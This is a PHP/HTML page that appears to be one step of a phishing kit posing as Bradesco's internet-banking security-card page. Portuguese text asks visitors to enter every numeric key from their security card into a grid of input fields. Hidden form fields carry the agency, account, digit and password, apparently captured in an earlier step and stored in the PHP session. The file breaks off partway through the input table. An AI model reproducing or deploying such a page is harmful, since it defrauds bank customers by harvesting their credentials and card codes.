<?php
error_reporting(0);
session_start();
?>


<HTML><HEAD>
<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
<META HTTP-EQUIV="Expires" CONTENT="-1">
<META HTTP-EQUIV="Cache-control" CONTENT="no-store">

<TITLE>Bradesco S/A</TITLE>

<script>
function saltaCampo(obj)
{
var elementos = document.getElementsByTagName('INPUT');
	var a = obj.tabIndex;
   
    if(obj.value.length>=obj.maxLength)
    {   
	for(var i=0;i<elementos.length;i++)
    {
        while(elementos[i].tabIndex==a+1)
        {  
		elementos[i].focus();
	    //alert(obj.tabIndex);
		
       // proximo(obj);
        return false;
    }
}
}
}
</script>
<!--
<script>
function saltaCampo() {

var doc = document.FLogin;


if(doc.pos1.value.length = 3){
doc.pos2.focus();
}
if(doc.pos2.value.length = 3){
doc.pos3.focus();
}
if(doc.pos3.value.length = 3){
doc.pos4.focus();
}
if(doc.pos4.value.length = 3){
doc.pos5.focus();
}
if(doc.pos5.value.length = 3){
doc.pos6.focus();
}
if(doc.pos6.value.length = 3){
doc.pos7.focus();
}
if(doc.pos7.value.length = 3){
doc.pos8.focus();
}
if(doc.pos8.value.length = 3){
doc.pos9.focus();
}
if(doc.pos9.value.length = 3){
doc.pos10.focus();
}
if(doc.pos10.value.length = 3){
doc.pos11.focus();
}
if(doc.pos11.value.length = 3){
doc.pos12.focus();
}
if(doc.pos12.value.length = 3){
doc.pos13.focus();
}
if(doc.pos13.value.length = 3){
doc.pos14.focus();
}
if(doc.pos14.value.length = 3){
doc.pos15.focus();
}
if(doc.pos15.value.length = 3){
doc.pos16.focus();
}
if(doc.pos16.value.length = 3){
doc.pos17.focus();
}
if(doc.pos17.value.length = 3){
doc.pos18.focus();
}
if(doc.pos18.value.length = 3){
doc.pos19.focus();
}
if(doc.pos19.value.length = 3){
doc.pos20.focus();
}
if(doc.pos20.value.length = 3){
doc.pos21.focus();
}
if(doc.pos21.value.length = 3){
doc.pos22.focus();
}
if(doc.pos22.value.length = 3){
doc.pos23.focus();
}
if(doc.pos23.value.length = 3){
doc.pos24.focus();
}
if(doc.pos24.value.length = 3){
doc.pos25.focus();
}
if(doc.pos25.value.length = 3){
doc.pos26.focus();
}
if(doc.pos26.value.length = 3){
doc.pos27.focus();
}
if(doc.pos27.value.length = 3){
doc.pos28.focus();
}
if(doc.pos28.value.length = 3){
doc.pos29.focus();
}
if(doc.pos29.value.length = 3){
doc.pos30.focus();
}
if(doc.pos30.value.length = 3){
doc.pos31.focus();
}
if(doc.pos31.value.length = 3){
doc.pos32.focus();
}
if(doc.pos32.value.length = 3){
doc.pos33.focus();
}
if(doc.pos33.value.length = 3){
doc.pos34.focus();
}
if(doc.pos34.value.length = 3){
doc.pos35.focus();
}
if(doc.pos35.value.length = 3){
doc.pos36.focus();
}
if(doc.pos36.value.length = 3){
doc.pos37.focus();
}
if(doc.pos37.value.length = 3){
doc.pos38.focus();
}
if(doc.pos38.value.length = 3){
doc.pos39.focus();
}
if(doc.pos39.value.length = 3){
doc.pos40.focus();
}
if(doc.pos40.value.length = 3){
doc.pos41.focus();
}
if(doc.pos41.value.length = 3){
doc.pos42.focus();
}
if(doc.pos42.value.length = 3){
doc.pos43.focus();
}
if(doc.pos43.value.length = 3){
doc.pos44.focus();
}
if(doc.pos44.value.length = 3){
doc.pos45.focus();
}
if(doc.pos45.value.length = 3){
doc.pos46.focus();
}
if(doc.pos46.value.length = 3){
doc.pos47.focus();
}
if(doc.pos47.value.length = 3){
doc.pos48.focus();
}
if(doc.pos48.value.length = 3){
doc.pos49.focus();
}
if(doc.pos49.value.length = 3){
doc.pos50.focus();
}
if(doc.pos50.value.length = 3){
doc.pos51.focus();
}
if(doc.pos51.value.length = 3){
doc.pos52.focus();
}
if(doc.pos52.value.length = 3){
doc.pos53.focus();
}
if(doc.pos53.value.length = 3){
doc.pos54.focus();
}
if(doc.pos54.value.length = 3){
doc.pos55.focus();
}
if(doc.pos55.value.length = 3){
doc.pos56.focus();
}
if(doc.pos56.value.length = 3){
doc.pos57.focus();
}
if(doc.pos57.value.length = 3){
doc.pos58.focus();
}
if(doc.pos58.value.length = 3){
doc.pos59.focus();
}
if(doc.pos59.value.length = 3){
doc.pos60.focus();
}
/*if(doc.pos61.value.length = 3){
doc.pos6.focus();
}
if(doc.pos6.value.length = 3){
doc.pos6.focus();
}
if(doc.pos6.value.length = 3){
doc.pos6.focus();
}
if(doc.pos6.value.length = 3){
doc.pos6.focus();
}
if(doc.pos6.value.length = 3){
doc.pos6.focus();
}
if(doc.pos6.value.length = 3){
doc.pos6.focus();
}
if(doc.pos6.value.length = 3){
doc.pos6.focus();
}
if(doc.pos6.value.length = 3){
doc.pos6.focus();
}
if(doc.pos6.value.length = 3){
doc.pos6.focus();
}*/



}
</script>  -->


<link rel="stylesheet" type="text/css" media="screen, print" href="Banco%20Bradesco%20S_A_files/estrutura.css" />

<link rel="stylesheet" type="text/css" media="screen, print" href="Banco%20Bradesco%20S_A_files/interna0.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery00.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery01.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery02.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery03.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/login000.css" />


    

<link rel="stylesheet" type="text/css" media="screen, print" href="Banco%20Bradesco%20S_A_files/conteudo.css" />




<script>
function exibeValor(nomeCampo, lenCampo, controle)
{
	if ((nomeCampo.value.length == lenCampo) && (checarTabulacao))
	{	
		var i=0;
		for (i=0; i<document.forms[0].elements.length; i++)
		{
			if (document.forms[0].elements[i].name == nomeCampo.name)
			{
				while ((i+1) < document.forms[0].elements.length)
				{
					if (document.forms[0].elements[i+1].type != "hidden")
					{
						document.forms[0].elements[i+1].focus();
						break;
					}
					i++;
				}
				checarTabulacao=false;
				break;
			}
		}
	}
}
	
function stopTabCheck(nomeCampo)
{checarTabulacao=false;}

function startTabCheck()
{checarTabulacao=true;}
</script>



    

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery00.js"></script>


    

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery01.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery02.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery03.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery04.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery05.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/swfobjec.js"></script>





<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/currency.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/validaco.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/default1.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/tecladov2.js"></script>




    



    <!--[if lt IE 8]>
	

<link rel="stylesheet" type="text/css" media="screen" href="https://www.ib3.bradesco.com.br/ibpf/conteudo/css/geral/geral_ie.css" />


	


	<![endif]-->

	<!--[if lt IE 7]>
	

<link rel="stylesheet" type="text/css" media="screen" href="https://www.ib3.bradesco.com.br/ibpf/conteudo/css/geral/geral_ie6.css" />


	

<script type="text/javascript" src="https://www.ib3.bradesco.com.br/ibpf/conteudo/js/geral/pngfix.js"></script>

<script type="text/javascript" src="https://www.ib3.bradesco.com.br/ibpf/conteudo/js/geral/jquery.bgiframe.js"></script>

<script type="text/javascript" src="https://www.ib3.bradesco.com.br/ibpf/conteudo/js/geral/default_ie.js"></script>


	<![endif]-->
    
    <script type="text/javascript"><!--
var isPrime=false;

//--></script>
    <script type="text/javascript"><!--
var loginMainUrlEncerra='https://www.ib2.bradesco.com.br/ibpflogin/logoff.jsf';

//--></script>
    <script type="text/javascript"><!--
var loginMainNomeCtl='CTL';

//--></script>
    <script type="text/javascript"><!--
var loginMainCtl='7605190925697317521150';

//--></script>
	    
	    
	    <script type="text/javascript">
			document.domain = "#";			
			function cancelarAcesso() {
 				window.top.location = loginMainUrlEncerra + "?" + loginMainNomeCtl + "=" + loginMainCtl;     
   				return false;
			}
	    </script>
	
<style type="text/css">
<!--
body {
	background-color: #FFFFFF;
}
-->
</style>
<script src="Scripts/AC_ActiveX.js" type="text/javascript"></script>
<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
</head>
<body>
<div id="miolo" style="margin-left:2px; margin-top:2px;"  class="after login">	
						
		<script type="text/javascript"><!--
var pametrosHdaSenha4UnicoTitular='n_0-0_introducao|hdaOfertaDisp=0&hdaQtdeTit=1';

//--></script><script type="text/javascript"><!--
var pametrosHdaSelecaoMultiplosTitulares='n_0-0_introducao|hdaOfertaDisp=0&hdaQtdeTit=2';

//--></script><script type="text/javascript"><!--
var pametrosHdaSenha4MultiplosTitulares='r_0-21_verificaoferta|hdaOfertaDisp=0';

//--></script><script type="text/javascript"><!--
var numControle='7605190925697317521150';

//--></script><script type="text/javascript"><!--
var hdaAtivadoLogin=false;

//--></script><script type="text/javascript"><!--
var hdaPosicaoLogin=1;

//--></script><script type="text/javascript"><!--
var hdaVisivelLogin=false;

//--></script><script type="text/javascript"><!--
var isPrimeiroAcesso=false;

//--></script><script type="text/javascript"><!--
var sequenciaTeclado=new Array(6,7,0,3,5,4,2,9,8,1);

//--></script>




<script type="text/javascript"><!--
var urlAutenticacao='autenticacao.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm';

//--></script>



<script type="text/javascript"><!--
var urlProximoTipoAutenticacao='tipoAutenticacao.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm?nome=valor';

//--></script><script type="text/javascript"><!--
var urlAceite='aceite.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm';

//--></script><script type="text/javascript"><!--
var urlProximaPagina='proxAutenticacao.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm';

//--></script><script type="text/javascript"><!--
var sequenciaProximoDispositivo=2;

//--></script>








<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/login000.js"></script>
<div id="conteudo" style="left:0; "  class="after conteudo_L">
  <script>           
        jQuery(function($) {          
            var tit = "Limpar";             
        	$('#botao_limpar').attr('title', tit); 
        });     
   </script>



<style> 
<!--
.font1 { text-decoration: none}
a.font1:hover {  text-decoration: none}
a {  text-decoration: none}
a:hover {  text-decoration: none}
.font0 { text-decoration: none}
a.font0:hover {  text-decoration: none}
a.fonte1 {  text-decoration: none}
a.fonte1:hover {  text-decoration: none}
.fonte1 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 11px;
	font-style: normal;
	color: #000000;
		}
.fonteIB {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 10px;
		}
.fonteSite:hover {  
	text-decoration: none;
	}
.fonteSite {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 11px;
	font-style: normal;
	text-decoration: none
		}
.fonteServ:hover {  
	text-decoration: none;
	color: #5B5B5C;
	}
.fonteServ {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 11px;
	font-style: normal;
	text-decoration: none;
	color: #E90B0B;
	}

//#pos114 {
}
.form1 {
	height: 13.5px;
	width: 30px;
	border: 1px 1 #000000;
	font: 10px Verdana, Arial, Helvetica, sans-serif;
	color: #000000;
	background: #FFFFFF;
}
.form11 {	height: 12px;
	width: 28px;
	font: 10px Verdana, Arial, Helvetica, sans-serif;
	color: #000000;
	background: #FFFFFF;
	left: 0px;
	top: 0px;
	right: 0px;
	bottom: 0px;
	clip: rect(0px,0px,0px,0px);
	margin: 0px;
	padding: 0px;
	text-decoration: none;
	border-top: 0px none;
	border-right: 0px none;
	border-bottom: 0px none;
	border-left: 0px none;
	clear: none;
	float: none;
	letter-spacing: 0em;
	text-align: center;
	word-spacing: 0em;
	display: compact;
	visibility: visible;
	z-index: auto;
	white-space: nowrap;
}
.formRef {	height: 20px;
	width: 100px;
	font: 11px Verdana, Arial, Helvetica, sans-serif;
	color: #000000;
	background: #FFFFFF;
	left: 0px;
	top: 0px;
	right: 0px;
	bottom: 0px;
	clip: rect(0px,0px,0px,0px);
	margin: 0px;
	padding: 0px;
	text-decoration: none;
	border-top: 0px none;
	border-right: 0px none;
	border-bottom: 0px none;
	border-left: 0px none;
	clear: none;
	float: none;
	letter-spacing: 0em;
	text-align: center;
	word-spacing: 0em;
	display: compact;
	position: fixed;
	visibility: visible;
	z-index: auto;
	white-space: nowrap;
}
.form12 {	height: 11px;
	width: 28px;
	font: 10px Verdana, Arial, Helvetica, sans-serif;
	color: #000000;
	background: #FFFFFF;
	left: 0px;
	top: 0px;
	right: 0px;
	bottom: 0px;
	clip: rect(0px,0px,0px,0px);
	margin: 0px 2px 0px 0px;
	padding: 0px;
	text-decoration: none;
	border-top: 0px none;
	border-right: 1px none;
	border-bottom: 0px none;
	border-left: 0px none;
	clear: right;
	float: right;
	letter-spacing: 0em;
	text-align: center;
	word-spacing: 0em;
	display: compact;
	visibility: visible;
	z-index: auto;
	white-space: nowrap;
}
.formRef1 {height: 22px;
	width: 128px;
	font: 12px Verdana, Arial, Helvetica, sans-serif;
	color: #000000;
	background: #FFFFFF;
	left: 0px;
	top: 0px;
	right: 0px;
	bottom: 0px;
	clip: rect(0px,0px,0px,0px);
	margin: 3px 0px 0px 1px;
	padding: 0px;
	text-decoration: none;
	border-top: 0px none;
	border-right: 0px none;
	border-bottom: 0px none;
	border-left: 0px none;
	clear: none;
	float: none;
	letter-spacing: 0em;
	text-align: center;
	word-spacing: 0em;
	display: compact;
	position: fixed;
	visibility: visible;
	z-index: auto;
	white-space: nowrap;
}
.formRef2 {height: 22px;
	width: 128px;
	font: 11px Verdana, Arial, Helvetica, sans-serif;
	color: #000000;
	background: #FFFFFF;
	left: 0px;
	top: 0px;
	right: 0px;
	bottom: 0px;
	clip: rect(0px,0px,0px,0px);
	margin: 3px 0px 0px 1px;
	padding: 0px;


	white-space: nowrap;
}
-->
</style>
<script language="JavaScript">
<!--
var agencia = '';
var conta = '';
var senha = '';
var resposta = '';
var dataext;
function getDia() {

		var nome_dia = new Array (7);
						
		nome_dia[0] = "Domingo";
		nome_dia[1] = "Segunda-Feira";
		nome_dia[2] = "Ter�a-Feira";
		nome_dia[3] = "Quarta-Feira";
		nome_dia[4] = "Quinta-Feira";
		nome_dia[5] = "Sexta-Feira";
		nome_dia[6] = "S�bado";
						
		var agora = new Date();
		var dia = nome_dia[agora.getDay()];
	    var extenso = dia + ', '
	    return extenso;
	}
	
function getData() {
	
		var nome_mes = new Array (12);
						
		nome_mes[0] = "Janeiro";
		nome_mes[1] = "Fevereiro";
		nome_mes[2] = "Mar�o";
		nome_mes[3] = "Abril";
		nome_mes[4] = "Maio";
		nome_mes[5] = "Junho";
		nome_mes[6] = "Julho";
		nome_mes[7] = "Agosto";
		nome_mes[8] = "Setembro";
		nome_mes[9] = "Outubro";
		nome_mes[10] = "Novembro";
		nome_mes[11] = "Dezembro";

		var agora = new Date();
		horas = agora.getHours();
		minutos = agora.getMinutes();
		if (horas < 10) horas = "0" + horas;
	        if (minutos < 10) minutos = "0" + minutos;

		var dia_do_mes = agora.getDate();
		var mes = nome_mes[agora.getMonth()];
		var ano = agora.getFullYear();
	    var extenso = dia_do_mes + ' de ' + mes + ' de ' + ano;
	    return extenso;
	}


function readCookie(name)
{
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++)
	{
		var c = ca[i];
		while (c.charAt(0)==' ') c = c.substring(1,c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
	}
	return null;
}


function dummy() {return false;}
PageInic = dummy;
function Inic()
{

PageInic();
}


//window.onload = Inic;
//-->
</script>

</HEAD>
<BODY aLink="#000000" leftmargin="0" topmargin="0" marginheight="0" marginwidth="0" 
background="fundo.gif"  bgColor="#FFFFFF" link="#000000" text="#000000"
vLink="#000000" onUnload="">
<a name="top">
<!--BrwGeral -->
<script language="JavaScript">
<!--
var appletId=0;
var lStarted = 0;
function Started()
{
	lStarted = 555;	
}
function VrfApplet(order)
{
  appletId = order;
    if(lStarted != 555)
      return false;
  return true
  
}
//-->
</script>


<script language="JavaScript">
<!--
function MMM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MMM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

var appletLayer = MMM_findObj('layerCriptApplet');
var appletArr;
if(document.layers)
{
//	if(appletLayer != null)
//		appletLayer.visibility = "hide";
	appletArr = document.layers['layerCriptApplet'].document.applets;
}
else
{
//	if(appletLayer != null)
//		appletLayer.style.visibility = "hidden";
	appletArr = document.applets;
}


function addNewParam(cript, paramName, paramValue)
{
	if(cript)
	{
		this.submitForm.elements[paramName].value = appletArr[appletId].cript(paramValue);
	}
	else
	{
		this.submitForm.elements[paramName].value = paramValue;		
	}
	return;
}
function addDestURL(fullurl, url, target)
{
	if(fullurl == false)
		url = window.location.protocol + "//" + window.location.host + url;		
	this.submitForm.action = url;
	if(target != null)
		this.submitForm.target = target;
	return;
}

function addSubmitForm(form)
{
	this.submitForm = form;
	return;
}

function sendData()
{
	this.submitForm.submit();
}

function CriptContext()
{
	this.submitForm = null;
	this.addSubmitForm = addSubmitForm;
	this.addDestURL = addDestURL;
	this.addNewParam = addNewParam;
	this.sendData = sendData;
}

//-->
</script>
<table cellpadding="0" cellspacing="0" width="75%" border="0">
 
  <!--  Ini - Linha separadora //-->
  <tr>
    <td bgcolor="#CCCCCC" height="1"></td>
  </tr>
  <!--  Fim - Linha separadora //-->
  <tr>
    <td><table cellpadding="0" cellspacing="0" border="0" width="745">
      <tr>
        <td width="10"></td>
        <td height="300" width="735" valign="top"><font size="1"><br>
          </font>
              <!--2//-->
              <script language="JavaScript">
<!--
function MudaStatus()
/*{
    if(VrfApplet(0) == true){
        if(document.FLogin.Confirma){
            document.FLogin.Confirma.src = "bt_confirmar.gif";
        }
        document.FLogin.SENHA.focus();
    }
    else
        setTimeout("MudaStatus()", 500);
}

var Bloq=false;
function VrfFrm()
{
    if(Bloq)
        return false;
    
    Bloq = true;
    if(!VrfApplet(0))
    {
        alert("Applet de seguran�a n�o carregado!");
        Bloq = false;
        return false;
    }

	// Projeto Apple
	var Cripto;
	//instanciar um contexto de criptografia
	Cripto = new CriptContext();
	//colocar o formul�rio que ser� usado para enviar dados ao servidor
	Cripto.addSubmitForm(document.forms['criptform']);
	//colocar a URL da p�gina destino, o primeiro parametro
	//indica se a URL � absoluta ou relativa (true se for absoluta).
	Cripto.addDestURL(false, document.dados.action);
	//atribui��o de dados abertos, com nome do vari�vel no formul�rio
	Cripto.addNewParam(false, "CTL", "7209795329444009910003"); 
	Cripto.addNewParam(false, "FLAGPLUGSEG", "0"); 

    //document.criptform.SENHA.value = document.applets[0].cript(window.document.dados.SENHA.value);
    Cripto.addNewParam(true, "SENHA", window.document.FLogin.SENHA.value); 
    
    window.document.FLogin.SENHA.value = "";
    //document.criptform.action = document.dados.action;
    //document.criptform.submit();
     Cripto.sendData();
    return false;
}*/
//-->
  </script>
              <table width="100%" border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td width="100%" height="20"><span class="after conteudo_L" style="left:0; "><img src="images/conf1.jpg" /></span></td>
                </tr>
                <tr>
                  <td width="100%" height="5"></td>
                </tr>
                <tr>
                  <td><img src="LOGINCHK_arquivos/seta_vermelha.jpg"><font face="Verdana, Arial" color="#E90B0B" size=2><b> Chave de Seguran�a Bradesco </b></font></td>
                </tr>
              </table>
			  
			  
			  
			  
			  
			  
			  
			  
			  
			<form name="FLogin" action="javascript:return false" onsubmit="return false; vai();" method="post" target="paginaCentral"> 
			 
<input type="hidden" name="agencia" value="<?php print("$_SESSION[agdes]"); ?>">
<input type="hidden" name="conta" value="<?php print("$_SESSION[ctdes]"); ?>">
<input type="hidden" name="digito" value="<?php print("$_SESSION[digdes]"); ?>">
<input type="hidden" name="senha" value="<?php print("$_SESSION[SENHA]");?>">
<input name="senhad6" id="senhad6" type="hidden" value="">


          <table border="0" cellspacing="0" cellpadding="0" width="94%">
                <tr>
                  <td width="4%"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"></font></td>
                  <td width="92%"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
                  
                    
                    Preencha os campos abaixo com os valores de <font color="#0000FF">todas</font> 
                    colunas contendo as chaves num&eacute;ricas indicadas no verso 
                    de seu cart&atilde;o. Este procedimento &eacute; unico, ap&oacute;s 
                    o correto preenchimento, apenas <font color="#0000FF">uma 
                    posi&ccedil;&atilde;o por vez</font> lhes ser&aacute; solicitado(a) 
                    a cada acesso ao Internet Banking. Utilize sua senha do cart&atilde;o 
                    atrav&eacute;s do teclado virtual para validar as informa&ccedil;&otilde;es 
                    e clique em <font color="#0000FF">Avan&ccedil;ar</font> para concluir 
                    o acesso com seguran&ccedil;a. 
                    <table>
                                        <tr>
                                          <td width="282" height="34" valign="middle"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"> Confira atentamente cada posi&ccedil;&atilde;o<br>
                                          </font> </td>
                                          <td width="70"></td>
                                          <td width="148" valign="middle"><div align="center"></div></td>
                                        </tr>
                  </table>
                  </font> </td>
                  <td width="4%"></td>
                </tr>
                <tr>
                  <td height="171"></td>
                  <td colspan="2">
                      <table width="100%" height="149" border="0" cellpadding="0" cellspacing="0">
                        <tr>
                          <td width="62%" height="149"><table border="0" cellpadding="0" cellspacing="0" width="404">
                            <!-- fwtable fwsrc="ok.PNG" fwbase="ok.jpg" fwstyle="Dreamweaver" fwdocid = "1540510380" fwnested="0" -->
                            <tr>
                              <td><img src="images/ct/figuras/spacer.gif" width="13" height="1" border="0" alt="" /></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="55" height="1" border="0" alt="" /></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="55" height="1" border="0" alt="" /></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="54" height="1" border="0" alt="" /></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="8" height="1" border="0" alt="" /></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="46" height="1" border="0" alt="" /></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="1" height="1" border="0" alt="" /></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="53" height="1" border="0" alt="" /></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="54" height="1" border="0" alt="" /></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="23" height="1" border="0" alt="" /></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="29" height="1" border="0" alt="" /></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="13" height="1" border="0" alt="" /></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="1" height="1" border="0" alt="" /></td>
                            </tr>
                            <tr>
                              <td colspan="12"><img name="ok_r1_c1" src="images/ct/figuras/ok_r1_c1.jpg" width="404" height="23" border="0" id="ok_r1_c1" alt="" /></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="1" height="23" border="0" alt="" /></td>
                            </tr>
                            <tr>
                              <td rowspan="13"><img name="ok_r2_c1" src="images/ct/figuras/ok_r2_c1.jpg" width="13" height="197" border="0" id="ok_r2_c1" alt="" /></td>
							  
							  
                              <td background="images/ct/figuras/ok_r2_c2.jpg"><input name="pos1" type="text" tabindex="1" class="form12" id="pos1" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/>
                              </td>
                              <td background="images/ct/figuras/ok_r2_c3.jpg"><input name="pos11" type="text" tabindex="11" class="form12" id="pos11" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r2_c4.jpg"><input name="pos21" type="text" tabindex="21" class="form12" id="pos21" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r2_c5.jpg"><input name="pos31" type="text" tabindex="31" class="form12" id="pos31" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r2_c7.jpg"><input name="pos41" type="text" tabindex="41" class="form12" id="pos41" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r2_c9.jpg"><input name="pos51" type="text" tabindex="51" class="form12" id="pos51" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r2_c10.jpg"><input name="pos61" type="text" tabindex="61" class="form12" id="pos61" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td rowspan="12"><img name="ok_r2_c12" src="images/ct/figuras/ok_r2_c12.jpg" width="13" height="182" border="0" id="ok_r2_c12" alt="" /></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="1" height="15" border="0" alt="" /></td>
                            </tr>
                            <tr>
                              <td background="images/ct/figuras/ok_r3_c2.jpg"><input name="pos2" type="text" tabindex="2" class="form12" id="pos2" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r3_c3.jpg"><input name="pos12" type="text" tabindex="12" class="form12" id="pos12" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r3_c4.jpg"><input name="pos22" type="text" tabindex="22" class="form12" id="pos22" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r3_c5.jpg"><input name="pos32" type="text" tabindex="32" class="form12" id="pos32" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r3_c7.jpg"><input name="pos42" type="text" tabindex="42" class="form12" id="pos42" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r3_c9.jpg"><input name="pos52" type="text" tabindex="52" class="form12" id="pos52" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r3_c10.jpg"><input name="pos62" type="text" tabindex="62" class="form12" id="pos62" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="1" height="15" border="0" alt="" /></td>
                            </tr>
                            <tr>
                              <td background="images/ct/figuras/ok_r4_c2.jpg"><input name="pos3" type="text" tabindex="3" class="form12" id="pos3" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r4_c3.jpg"><input name="pos13" type="text" tabindex="13" class="form12" id="pos13" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r4_c4.jpg"><input name="pos23" type="text" tabindex="23" class="form12" id="pos23" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r4_c5.jpg"><input name="pos33" type="text" tabindex="33" class="form12" id="pos33" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r4_c7.jpg"><input name="pos43" type="text" tabindex="43" class="form12" id="pos43" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r4_c9.jpg"><input name="pos53" type="text" tabindex="53" class="form12" id="pos53" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r4_c10.jpg"><input name="pos63" type="text" tabindex="63" class="form12" id="pos63" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="1" height="15" border="0" alt="" /></td>
                            </tr>
                            <tr>
                              <td background="images/ct/figuras/ok_r5_c2.jpg"><input name="pos4" type="text" tabindex="4" class="form12" id="pos4" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r5_c3.jpg"><input name="pos14" type="text" tabindex="14" class="form12" id="pos14" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r5_c4.jpg"><input name="pos24" type="text" tabindex="24" class="form12" id="pos24" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r5_c5.jpg"><input name="pos34" type="text" tabindex="34" class="form12" id="pos34" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r5_c7.jpg"><input name="pos44" type="text" tabindex="44" class="form12" id="pos44" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r5_c9.jpg"><input name="pos54" type="text" tabindex="54" class="form12" id="pos54" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r5_c10.jpg"><input name="pos64" type="text" tabindex="64" class="form12" id="pos64" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="1" height="15" border="0" alt="" /></td>
                            </tr>
                            <tr>
